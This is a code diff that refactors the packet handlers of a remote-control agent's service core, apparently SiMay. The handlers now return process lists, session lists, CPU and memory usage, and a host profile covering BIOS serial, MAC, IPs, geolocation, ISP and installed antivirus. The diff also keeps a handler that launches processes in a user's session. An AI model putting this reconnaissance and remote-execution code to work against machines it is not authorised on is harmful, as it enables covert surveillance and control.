@@ -42,8 +42,6 @@ namespace SiMay.ServiceCore
                 }
                 catch { }
             }
-
-            this.SendProcessList();
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_MAXIMIZE)]
@@ -65,23 +63,8 @@ namespace SiMay.ServiceCore
             }
         }
 
-        [PacketHandler(MessageHead.S_SYSTEM_GET_PROCESS_LIST)]
-        public void HandlerGetSystemProcessList(SessionProviderContext session)
-            => this.SendProcessList();
-
-
         [PacketHandler(MessageHead.S_SYSTEM_ENUMSESSIONS)]
-        public void GetSessionItemHandler(SessionProviderContext session)
-            => SendSessionItem();
-
-        [PacketHandler(MessageHead.S_SYSTEM_CREATE_USER_PROCESS)]
-        public void CreateProcessAsUser(SessionProviderContext session)
-        {
-            var sessionId = session.GetMessageEntity<CreateProcessAsUserPack>().SessionId;
-            UserTrunkContext.UserTrunkContextInstance?.CreateProcessAsUser(sessionId);
-        }
-
-        private void SendSessionItem()
+        public SessionsPacket GetSessionItemHandler(SessionProviderContext session)
         {
             var sessions = UserTrunkContext.UserTrunkContextInstance?.GetSessionItems()
                 .Select(c => new Core.SessionItem()
@@ -95,16 +78,23 @@ namespace SiMay.ServiceCore
                 .ToArray();
 
             if (sessions.IsNull())
-                return;
+                return null;
 
-            CurrentSession.SendTo(MessageHead.C_SYSTEM_SESSIONS,
-                        new SessionsPacket()
-                        {
-                            Sessions = sessions
-                        });
+            return new SessionsPacket()
+            {
+                Sessions = sessions
+            };
         }
 
-        private void SendProcessList()
+        [PacketHandler(MessageHead.S_SYSTEM_CREATE_USER_PROCESS)]
+        public void CreateProcessAsUser(SessionProviderContext session)
+        {
+            var sessionId = session.GetMessageEntity<CreateProcessAsUserPack>().SessionId;
+            UserTrunkContext.UserTrunkContextInstance?.CreateProcessAsUser(sessionId);
+        }
+
+        [PacketHandler(MessageHead.S_SYSTEM_GET_PROCESS_LIST)]
+        public ProcessListPack HandlerGetSystemProcessList(SessionProviderContext session)
         {
             var processList = Process.GetProcesses()
                 .OrderBy(p => p.ProcessName)
@@ -121,17 +111,10 @@ namespace SiMay.ServiceCore
                     FilePath = this.GetProcessFilePath(c)
                 }).ToArray();
 
-            //processList = processList.Join(GetProcessUserName(), p => p.ProcessId, p => p.Key, (p, n) =>
-            //{
-            //    p.User = n.Value;
-            //    return p;
-            //}).ToArray();
-
-            CurrentSession.SendTo(MessageHead.C_SYSTEM_PROCESS_LIST,
-                new ProcessListPack()
-                {
-                    ProcessList = processList
-                });
+            return new ProcessListPack()
+            {
+                ProcessList = processList
+            };
         }
         private string GetProcessFilePath(Process process)
         {
@@ -146,139 +129,136 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_GET_SYSTEMINFO)]
-        public void GetSystemInfosHandler(SessionProviderContext session)
+        public SystemInfoPacket GetSystemInfosHandler(SessionProviderContext session)
         {
-            ThreadHelper.ThreadPoolStart(c =>
+            GeoLocationHelper.Initialize();
+
+            var infos = new List<SystemInfoItem>();
+            infos.Add(new SystemInfoItem()
             {
-                GeoLocationHelper.Initialize();
-
-                var infos = new List<SystemInfoItem>();
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "主板序列号",
-                    Value = GetSystemInforHelper.BIOSSerialNumber
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "网卡MAC",
-                    Value = GetSystemInforHelper.GetMacAddress
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "驱动器存储信息",
-                    Value = GetSystemInforHelper.GetMyDriveInfo
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "运行目录",
-                    Value = Application.ExecutablePath
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "系统版本号",
-                    Value = Environment.Version.ToString()
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "启动毫秒",
-                    Value = Environment.TickCount.ToString()
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "登录账户",
-                    Value = Environment.UserName
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "被控服务启动时间",
-                    Value = AppConfiguartion.RunTime
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "系统版本",
-                    Value = GetSystemInforHelper.GetOSFullName
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "系统核心数",
-                    Value = Environment.ProcessorCount.ToString()
-                });
-
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "CPU信息",
-                    Value = GetSystemInforHelper.GetMyCpuInfo
-                });
-
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "系统内存",
-                    Value = (GetSystemInforHelper.GetMyMemorySize / 1024 / 1024) + "MB"
-                });
-
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "计算机名称",
-                    Value = Environment.MachineName
-                });
-
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "被控服务版本",
-                    Value = AppConfiguartion.Version
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "WAN IP",
-                    Value = GeoLocationHelper.GeoInfo.Ip
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "LAN IP",
-                    Value = GetSystemInforHelper.GetLocalIPv4()
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "安全软件",
-                    Value = GetSystemInforHelper.GetAntivirus()
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "国家",
-                    Value = GeoLocationHelper.GeoInfo.Country
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "ISP",
-                    Value = GeoLocationHelper.GeoInfo.Isp
-                });
-                infos.Add(new SystemInfoItem()
-                {
-                    ItemName = "GPU",
-                    Value = GetSystemInforHelper.GetGpuName()
-                });
-                var sysInfos = new SystemInfoPacket();
-                sysInfos.SystemInfos = infos.ToArray();
-                CurrentSession.SendTo(MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
+                ItemName = "主板序列号",
+                Value = GetSystemInforHelper.BIOSSerialNumber
             });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "网卡MAC",
+                Value = GetSystemInforHelper.GetMacAddress
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "驱动器存储信息",
+                Value = GetSystemInforHelper.GetMyDriveInfo
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "运行目录",
+                Value = Application.ExecutablePath
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "系统版本号",
+                Value = Environment.Version.ToString()
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "启动毫秒",
+                Value = Environment.TickCount.ToString()
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "登录账户",
+                Value = Environment.UserName
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "被控服务启动时间",
+                Value = AppConfiguartion.RunTime
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "系统版本",
+                Value = GetSystemInforHelper.GetOSFullName
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "系统核心数",
+                Value = Environment.ProcessorCount.ToString()
+            });
+
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "CPU信息",
+                Value = GetSystemInforHelper.GetMyCpuInfo
+            });
+
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "系统内存",
+                Value = (GetSystemInforHelper.GetMyMemorySize / 1024 / 1024) + "MB"
+            });
+
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "计算机名称",
+                Value = Environment.MachineName
+            });
+
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "被控服务版本",
+                Value = AppConfiguartion.Version
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "WAN IP",
+                Value = GeoLocationHelper.GeoInfo.Ip
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "LAN IP",
+                Value = GetSystemInforHelper.GetLocalIPv4()
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "安全软件",
+                Value = GetSystemInforHelper.GetAntivirus()
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "国家",
+                Value = GeoLocationHelper.GeoInfo.Country
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "ISP",
+                Value = GeoLocationHelper.GeoInfo.Isp
+            });
+            infos.Add(new SystemInfoItem()
+            {
+                ItemName = "GPU",
+                Value = GetSystemInforHelper.GetGpuName()
+            });
+            var sysInfos = new SystemInfoPacket();
+            sysInfos.SystemInfos = infos.ToArray();
+
+            return sysInfos;
         }
 
         [PacketHandler(MessageHead.S_SYSTEM_GET_OCCUPY)]
-        public void handlerGetSystemOccupyRate(SessionProviderContext session)
+        public SystemOccupyPack handlerGetSystemOccupyRate(SessionProviderContext session)
         {
             string cpuUserate = "-1";
             try
             {
-                cpuUserate = ((_cpuInfo.NextValue() / (float)Environment.ProcessorCount)).ToString("0.0") + "%";
+                cpuUserate = ((_cpuInfo.NextValue() / Environment.ProcessorCount * 100f)).ToString("0.0") + "%";
             }
             catch { }
 
-            CurrentSession.SendTo(MessageHead.C_SYSTEM_OCCUPY_INFO,
-                new SystemOccupyPack()
-                {
-                    CpuUsage = cpuUserate,
-                    MemoryUsage = (_memoryInfo.TotalPhysicalMemory / 1024 / 1024).ToString() + "MB/" + ((_memoryInfo.TotalPhysicalMemory - _memoryInfo.AvailablePhysicalMemory) / 1024 / 1024).ToString() + "MB"
-                });
+            return new SystemOccupyPack()
+            {
+                CpuUsage = cpuUserate,
+                MemoryUsage = (_memoryInfo.TotalPhysicalMemory / 1024 / 1024).ToString() + "MB/" + ((_memoryInfo.TotalPhysicalMemory - _memoryInfo.AvailablePhysicalMemory) / 1024 / 1024).ToString() + "MB"
+            };
         }
     }
 }
